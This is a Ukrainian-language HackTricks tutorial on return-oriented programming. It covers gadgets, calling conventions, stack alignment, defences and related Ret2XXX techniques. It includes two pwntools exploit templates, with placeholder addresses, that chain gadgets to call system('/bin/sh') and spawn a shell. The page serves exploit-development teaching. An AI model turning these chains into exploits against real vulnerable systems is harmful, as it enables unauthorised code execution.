# ROP - Return Oriented Programing

{{#include ../../banners/hacktricks-training.md}}

## **Основна інформація**

**Return-Oriented Programming (ROP)** - це просунута техніка експлуатації, що використовується для обходу заходів безпеки, таких як **No-Execute (NX)** або **Data Execution Prevention (DEP)**. Замість того, щоб інжектувати та виконувати shellcode, зловмисник використовує фрагменти коду, які вже присутні в бінарному файлі або в завантажених бібліотеках, відомі як **"gadgets"**. Кожен gadget зазвичай закінчується інструкцією `ret` і виконує невелику операцію, таку як переміщення даних між реєстрами або виконання арифметичних операцій. Поєднуючи ці gadgets, зловмисник може створити payload для виконання довільних операцій, ефективно обходячи захисти NX/DEP.

### Як працює ROP

1. **Перехоплення потоку управління**: Спочатку зловмисник повинен перехопити потік управління програми, зазвичай експлуатуючи переповнення буфера для перезапису збереженої адреси повернення в стеку.
2. **Поєднання gadgets**: Потім зловмисник обережно вибирає та поєднує gadgets для виконання бажаних дій. Це може включати налаштування аргументів для виклику функції, виклик функції (наприклад, `system("/bin/sh")`) та обробку будь-яких необхідних очищень або додаткових операцій.
3. **Виконання payload**: Коли вразлива функція повертається, замість повернення до легітимного місця, вона починає виконувати ланцюг gadgets.

### Інструменти

Зазвичай gadgets можна знайти за допомогою [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) або безпосередньо з **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Приклад ROP Chain в x86

### **x86 (32-біт) Конвенції виклику**

- **cdecl**: Викликач очищає стек. Аргументи функції поміщаються в стек у зворотному порядку (з правого на ліве). **Аргументи поміщаються в стек з правого на ліве.**
- **stdcall**: Схоже на cdecl, але викликана функція відповідає за очищення стека.

### **Знаходження gadgets**

Спочатку припустимо, що ми визначили необхідні gadgets у бінарному файлі або його завантажених бібліотеках. Gadgets, які нас цікавлять:

- `pop eax; ret`: Цей gadget витягує верхнє значення стека в регістр `EAX` і потім повертається, дозволяючи нам контролювати `EAX`.
- `pop ebx; ret`: Схоже на попередній, але для регістра `EBX`, що дозволяє контролювати `EBX`.
- `mov [ebx], eax; ret`: Переміщує значення в `EAX` у пам'ятеву адресу, на яку вказує `EBX`, і потім повертається. Це часто називається **write-what-where gadget**.
- Крім того, у нас є адреса функції `system()`.

### **ROP Chain**

Використовуючи **pwntools**, ми готуємо стек для виконання ROP chain наступним чином, намагаючись виконати `system('/bin/sh')`, зверніть увагу, як ланцюг починається з:

1. Інструкції `ret` для вирівнювання (необов'язково)
2. Адреси функції `system` (припускаючи, що ASLR вимкнено і libc відома, більше інформації в [**Ret2lib**](ret2lib/))
3. Заповнювач для адреси повернення з `system()`
4. Адреса рядка `"/bin/sh"` (параметр для функції system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## ROP Chain в x64 Приклад

### **x64 (64-біт) Виклик конвенцій**

- Використовує конвенцію виклику **System V AMD64 ABI** на системах, подібних до Unix, де **перші шість цілочисельних або вказівних аргументів передаються в регістри `RDI`, `RSI`, `RDX`, `RCX`, `R8` та `R9`**. Додаткові аргументи передаються на стек. Значення повернення розміщується в `RAX`.
- Конвенція виклику **Windows x64** використовує `RCX`, `RDX`, `R8` та `R9` для перших чотирьох цілочисельних або вказівних аргументів, з додатковими аргументами, що передаються на стек. Значення повернення розміщується в `RAX`.
- **Регістри**: 64-бітні регістри включають `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` та `R8` до `R15`.

#### **Знаходження Гаджетів**

Для наших цілей зосередимося на гаджетах, які дозволять нам встановити регістр **RDI** (щоб передати рядок **"/bin/sh"** як аргумент для **system()**) і потім викликати функцію **system()**. Ми припустимо, що ми визначили наступні гаджети:

- **pop rdi; ret**: Витягує верхнє значення зі стека в **RDI** і потім повертається. Важливо для встановлення нашого аргументу для **system()**.
- **ret**: Просте повернення, корисне для вирівнювання стека в деяких сценаріях.

І ми знаємо адресу функції **system()**.

### **ROP Chain**

Нижче наведено приклад використання **pwntools** для налаштування та виконання ROP ланцюга, що має на меті виконати **system('/bin/sh')** на **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
У цьому прикладі:

- Ми використовуємо гаджет **`pop rdi; ret`** для встановлення **`RDI`** на адресу **`"/bin/sh"`**.
- Ми безпосередньо переходимо до **`system()`** після встановлення **`RDI`**, з адресою **system()** в ланцюгу.
- **`ret_gadget`** використовується для вирівнювання, якщо цільове середовище цього вимагає, що є більш поширеним у **x64** для забезпечення правильного вирівнювання стеку перед викликом функцій.

### Вирівнювання стеку

**x86-64 ABI** забезпечує, щоб **стек був вирівняний на 16 байт** під час виконання **інструкції виклику**. **LIBC**, для оптимізації продуктивності, **використовує інструкції SSE** (такі як **movaps**), які вимагають цього вирівнювання. Якщо стек не вирівняний належним чином (означає, що **RSP** не є кратним 16), виклики функцій, таких як **system**, зазнають невдачі в **ROP ланцюзі**. Щоб виправити це, просто додайте **ret gadget** перед викликом **system** у вашому ROP ланцюзі.

## Основна різниця між x86 та x64

> [!TIP]
> Оскільки **x64 використовує регістри для перших кількох аргументів,** це часто вимагає менше гаджетів, ніж x86 для простих викликів функцій, але знаходження та з'єднання правильних гаджетів може бути більш складним через збільшену кількість регістрів і більший адресний простір. Збільшена кількість регістрів і більший адресний простір в архітектурі **x64** надають як можливості, так і виклики для розробки експлойтів, особливо в контексті Return-Oriented Programming (ROP).

## Приклад ROP ланцюга в ARM64

### **Основи ARM64 та викликові конвенції**

Перевірте наступну сторінку для цієї інформації:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Захист від ROP

- [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/): Ці захисти ускладнюють використання ROP, оскільки адреси гаджетів змінюються між виконаннями.
- [**Stack Canaries**](../common-binary-protections-and-bypasses/stack-canaries/): У випадку BOF, потрібно обійти зберігання canary стеку, щоб перезаписати вказівники повернення для зловживання ROP ланцюгом.
- **Брак гаджетів**: Якщо недостатньо гаджетів, не буде можливості згенерувати ROP ланцюг.

## Техніки на основі ROP

Зверніть увагу, що ROP - це лише техніка для виконання довільного коду. На основі ROP було розроблено багато технік Ret2XXX:

- **Ret2lib**: Використовуйте ROP для виклику довільних функцій з завантаженої бібліотеки з довільними параметрами (зазвичай щось на зразок `system('/bin/sh')`.

{{#ref}}
ret2lib/
{{#endref}}

- **Ret2Syscall**: Використовуйте ROP для підготовки виклику до системного виклику, наприклад, `execve`, і змусьте його виконати довільні команди.

{{#ref}}
rop-syscall-execv/
{{#endref}}

- **EBP2Ret & EBP Chaining**: Перший буде зловживати EBP замість EIP для контролю потоку, а другий подібний до Ret2lib, але в цьому випадку потік контролюється в основному адресами EBP (хоча також потрібно контролювати EIP).

{{#ref}}
../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md
{{#endref}}

## Інші приклади та посилання

- [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
- [https://guyinatuxedo.github.io/15-partial_overwrite/hacklu15_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial_overwrite/hacklu15_stackstuff/index.html)
- 64 біт, Pie та nx увімкнено, без canary, перезаписати RIP з адресою `vsyscall` з єдиною метою повернення до наступної адреси в стеку, яка буде частковим перезаписом адреси для отримання частини функції, яка витікає з прапора.
- [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
- arm64, без ASLR, ROP гаджет для виконання стеку та переходу до shellcode в стеку.

{{#include ../../banners/hacktricks-training.md}}
